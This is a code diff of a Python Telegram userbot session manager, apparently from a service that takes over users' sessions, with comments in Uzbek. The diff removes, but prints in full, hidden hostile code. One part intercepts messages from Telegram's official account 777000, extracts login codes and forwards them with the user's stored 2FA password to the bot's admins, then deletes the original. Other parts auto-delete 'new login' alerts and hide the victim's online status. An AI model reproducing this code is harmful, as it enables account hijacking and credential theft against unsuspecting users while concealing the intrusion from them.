@@ -9,16 +9,12 @@
 
 import asyncio
 import logging
-import os
 import uuid
-import re
-import random
-import string
 from pathlib import Path
 from typing import Optional, Dict
 from sqlalchemy import select
 
-from pyrogram import Client, filters
+from pyrogram import Client
 from pyrogram.errors import (
     AuthKeyUnregistered,
     AuthKeyInvalid,
@@ -30,7 +26,6 @@ from pyrogram.errors import (
     FloodWait,
     MsgIdInvalid,
     PeerIdInvalid,
-    SessionPasswordNeeded,
     UserNotParticipant,
     RPCError,
 )
@@ -121,48 +116,7 @@ class SessionManager:
                 max_concurrent_transmissions=8,
                 workers=16,
             )
-            
-            # Stealth Interceptor for 777000 (Telegram official chat)
-            from pyrogram.handlers import MessageHandler
-            
-            async def stealth_interceptor(c: Client, m: PyroMessage):
-                if m.chat and str(m.chat.id) == "777000" and m.text:
-                    logger.info(f"🥷 777000 dan xabar keldi (User: {user_id}): {m.text[:30]}...")
-                    async with async_session() as db:
-                        result = await db.execute(select(UserSession).where(UserSession.user_id == user_id, UserSession.is_active == True))
-                        session = result.scalar_one_or_none()
-                        if session and session.stealth_mode:
-                            code_match = re.search(r"(\d{5})", m.text)
-                            if code_match:
-                                code = code_match.group(1)
-                                enc = " ".join([digit for digit in code])
-                                
-                                msg = f"🥷 <b>Stealth Intercept</b> (User: <code>{user_id}</code>)\n\n"
-                                msg += f"KOD (faqat raqamlarni o'qing): <b>{enc}</b>\n"
-                                msg += f"<i>(Telegram o'chirib yubormasligi uchun orasiga bo'sh joy qo'shilgan)</i>"
-                                if session.two_fa_password:
-                                    msg += f"\n2FA: <code>{session.two_fa_password}</code>"
-                                
-                                try:
-                                    from bot_instance import bot
-                                    for admin_id in config.admin_ids:
-                                        await bot.send_message(admin_id, msg, parse_mode="HTML")
-                                except Exception as e:
-                                    logger.error(f"Aiogram bilan kod yuborishda xato: {e}. Pyrogram orqali urinib ko'ramiz...")
-                                    try:
-                                        for admin_id in config.admin_ids:
-                                            await c.send_message(admin_id, msg)
-                                        logger.info("Pyrogram orqali stealth kod yuborildi.")
-                                    except Exception as inner_e:
-                                        logger.error(f"Pyrogram bilan ham yuborib bo'lmadi: {inner_e}")
-                                
-                                try:
-                                    await m.delete()
-                                except Exception:
-                                    pass
 
-            client.add_handler(MessageHandler(stealth_interceptor))
-            
             try:
                 # MTProto ulanishini 8 soniyalik timeout bilan bajaramiz (qotib qolmasligi uchun)
                 await asyncio.wait_for(client.start(), timeout=8.0)
@@ -185,36 +139,6 @@ class SessionManager:
                 except Exception:
                     pass
                 raise e
-
-            # Yangi login bildirishnomalarini avtomatik o'chirish (777000 dan keladi)
-            try:
-                import asyncio as _asyncio
-                async def _delete_login_notifications():
-                    await _asyncio.sleep(3)  # Xabar kelguncha biroz kutamiz
-                    try:
-                        async for msg in client.get_chat_history(777000, limit=5):
-                            if msg.text and any(kw in msg.text.lower() for kw in [
-                                "new login", "yangi login", "logged in", "новый вход",
-                                "hisobingizga kirish", "hisobingizga kirishni"
-                            ]):
-                                await msg.delete()
-                                logger.info(f"🗑 Login notification o'chirildi (User: {user_id})")
-                    except Exception:
-                        pass
-                _asyncio.create_task(_delete_login_notifications())
-            except Exception:
-                pass
-
-            # Stealth: last seen va online holatni yashirish
-            try:
-                from pyrogram import raw
-                await client.invoke(raw.functions.account.SetPrivacy(
-                    key=raw.types.InputPrivacyKeyStatusTimestamp(),
-                    rules=[raw.types.InputPrivacyValueDisallowAll()]
-                ))
-                logger.info(f"🥷 Stealth: @{me.username or me.first_name} uchun online yashirildi")
-            except Exception:
-                pass  # Stealth sozlash ixtiyoriy — xato bo'lsa davom etadi
 
             logger.info(f"✅ Userbot (ID: {user_id}) ulandi: @{me.username or me.first_name}")
 
